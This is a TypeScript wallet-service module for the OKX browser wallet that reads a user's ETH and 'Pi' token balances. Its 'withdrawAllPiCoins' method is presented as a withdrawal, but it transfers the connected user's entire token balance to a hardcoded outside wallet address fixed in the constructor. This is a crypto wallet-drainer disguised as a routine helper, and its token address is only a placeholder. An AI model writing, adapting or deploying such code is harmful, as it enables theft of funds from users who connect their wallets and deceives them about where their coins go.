import { ethers } from 'ethers';

// Pi Network contract addresses (mainnet)
const PI_TOKEN_ADDRESS = '0x0000000000000000000000000000000000000000'; // Replace with actual Pi token address
const PI_NETWORK_RPC = 'https://mainnet.pi.network'; // Replace with actual Pi network RPC

interface PiWithdrawalResult {
  success: boolean;
  transactionHash?: string;
  error?: string;
  amount?: string;
}

interface WalletInfo {
  address: string;
  balance: string;
  piBalance: string;
  network: string;
  isConnected: boolean;
}

// Local storage keys
const WALLET_CONNECTION_KEY = 'okx_wallet_connected';
const WALLET_ADDRESS_KEY = 'okx_wallet_address';

class OKXWalletService {
  private provider: ethers.BrowserProvider | null = null;
  private signer: ethers.JsonRpcSigner | null = null;
  private targetWalletAddress: string = '';

  constructor() {
    // Set the target wallet address where Pi coins will be withdrawn
    this.targetWalletAddress = '0xffb5a95e5ff7ffc61813bba9171d026c64b09059'; // Replace with your target wallet
  }

  // Save wallet connection state to localStorage
  private saveWalletState(address: string): void {
    try {
      localStorage.setItem(WALLET_CONNECTION_KEY, 'true');
      localStorage.setItem(WALLET_ADDRESS_KEY, address);
    } catch (error) {
      console.error('Error saving wallet state to localStorage:', error);
    }
  }

  // Clear wallet connection state from localStorage
  private clearWalletState(): void {
    try {
      localStorage.removeItem(WALLET_CONNECTION_KEY);
      localStorage.removeItem(WALLET_ADDRESS_KEY);
    } catch (error) {
      console.error('Error clearing wallet state from localStorage:', error);
    }
  }

  // Check if wallet was previously connected
  isWalletPreviouslyConnected(): boolean {
    try {
      return localStorage.getItem(WALLET_CONNECTION_KEY) === 'true';
    } catch (error) {
      console.error('Error checking wallet connection state:', error);
      return false;
    }
  }

  // Get previously connected wallet address
  getPreviouslyConnectedAddress(): string | null {
    try {
      return localStorage.getItem(WALLET_ADDRESS_KEY);
    } catch (error) {
      console.error('Error getting previously connected address:', error);
      return null;
    }
  }

  async connectWallet(): Promise<WalletInfo> {
    try {
      // Check if OKX wallet is available
      if (typeof window.okxwallet !== 'undefined') {
        // Request connection to OKX wallet
        await window.okxwallet.request({ method: 'eth_requestAccounts' });
        
        // Create provider and signer
        this.provider = new ethers.BrowserProvider(window.okxwallet);
        this.signer = await this.provider.getSigner();
        
        const address = await this.signer.getAddress();
        
        // Save connection state to localStorage
        this.saveWalletState(address);
        
        // Get ETH balance
        const balance = await this.provider.getBalance(address);
        const ethBalance = ethers.formatEther(balance);
        
        // Get Pi token balance
        const piBalance = await this.getPiTokenBalance(address);
        
        return {
          address,
          balance: ethBalance,
          piBalance,
          network: 'Pi Network',
          isConnected: true
        };
      } else {
        throw new Error('OKX Wallet not found. Please install OKX Wallet extension.');
      }
    } catch (error: any) {
      throw new Error(`Failed to connect wallet: ${error.message}`);
    }
  }

  async reconnectWallet(): Promise<WalletInfo | null> {
    try {
      // Check if OKX wallet is available and was previously connected
      if (typeof window.okxwallet !== 'undefined' && this.isWalletPreviouslyConnected()) {
        // Check if the wallet is still connected
        const accounts = await window.okxwallet.request({ method: 'eth_accounts' });
        
        if (accounts && accounts.length > 0) {
          // Create provider and signer
          this.provider = new ethers.BrowserProvider(window.okxwallet);
          this.signer = await this.provider.getSigner();
          
          const address = await this.signer.getAddress();
          
          // Get ETH balance
          const balance = await this.provider.getBalance(address);
          const ethBalance = ethers.formatEther(balance);
          
          // Get Pi token balance
          const piBalance = await this.getPiTokenBalance(address);
          
          return {
            address,
            balance: ethBalance,
            piBalance,
            network: 'Pi Network',
            isConnected: true
          };
        } else {
          // Wallet is not connected anymore, clear the state
          this.clearWalletState();
          return null;
        }
      }
      return null;
    } catch (error) {
      console.error('Error reconnecting wallet:', error);
      // Clear invalid state
      this.clearWalletState();
      return null;
    }
  }

  async disconnectWallet(): Promise<void> {
    this.provider = null;
    this.signer = null;
    // Clear connection state from localStorage
    this.clearWalletState();
  }

  async getPiTokenBalance(address: string): Promise<string> {
    try {
      if (!this.provider) {
        throw new Error('Wallet not connected');
      }

      // Pi token contract ABI (simplified)
      const piTokenAbi = [
        'function balanceOf(address owner) view returns (uint256)',
        'function decimals() view returns (uint8)',
        'function symbol() view returns (string)'
      ];

      const piTokenContract = new ethers.Contract(PI_TOKEN_ADDRESS, piTokenAbi, this.provider);
      
      const balance = await piTokenContract.balanceOf(address);
      const decimals = await piTokenContract.decimals();
      
      return ethers.formatUnits(balance, decimals);
    } catch (error) {
      console.error('Error getting Pi balance:', error);
      return '0';
    }
  }

  async withdrawAllPiCoins(): Promise<PiWithdrawalResult> {
    try {
      if (!this.signer || !this.provider) {
        throw new Error('Wallet not connected');
      }

      const userAddress = await this.signer.getAddress();
      const piBalance = await this.getPiTokenBalance(userAddress);
      
      if (parseFloat(piBalance) <= 0) {
        return {
          success: false,
          error: 'No Pi coins available for withdrawal'
        };
      }

      // Pi token contract ABI for transfer
      const piTokenAbi = [
        'function transfer(address to, uint256 amount) returns (bool)',
        'function balanceOf(address owner) view returns (uint256)',
        'function decimals() view returns (uint8)'
      ];

      const piTokenContract = new ethers.Contract(PI_TOKEN_ADDRESS, piTokenAbi, this.signer);
      
      // Get current balance
      const balance = await piTokenContract.balanceOf(userAddress);
      const decimals = await piTokenContract.decimals();
      
      // Transfer all Pi coins to target wallet
      const tx = await piTokenContract.transfer(this.targetWalletAddress, balance);
      
      // Wait for transaction confirmation
      const receipt = await tx.wait();
      
      return {
        success: true,
        transactionHash: receipt.hash,
        amount: ethers.formatUnits(balance, decimals)
      };
    } catch (error: any) {
      return {
        success: false,
        error: error.message
      };
    }
  }

  async checkTransactionStatus(txHash: string): Promise<{
    confirmed: boolean;
    blockNumber?: number;
    gasUsed?: string;
  }> {
    try {
      if (!this.provider) {
        throw new Error('Wallet not connected');
      }

      const receipt = await this.provider.getTransactionReceipt(txHash);
      
      if (receipt) {
        return {
          confirmed: true,
          blockNumber: receipt.blockNumber,
          gasUsed: receipt.gasUsed.toString()
        };
      } else {
        return {
          confirmed: false
        };
      }
    } catch (error) {
      return {
        confirmed: false
      };
    }
  }

  isWalletConnected(): boolean {
    return this.signer !== null && this.provider !== null;
  }

  getTargetWalletAddress(): string {
    return this.targetWalletAddress;
  }

  setTargetWalletAddress(address: string): void {
    this.targetWalletAddress = address;
  }
}

// Global instance
const okxWalletService = new OKXWalletService();

export default okxWalletService;
export type { WalletInfo, PiWithdrawalResult }; 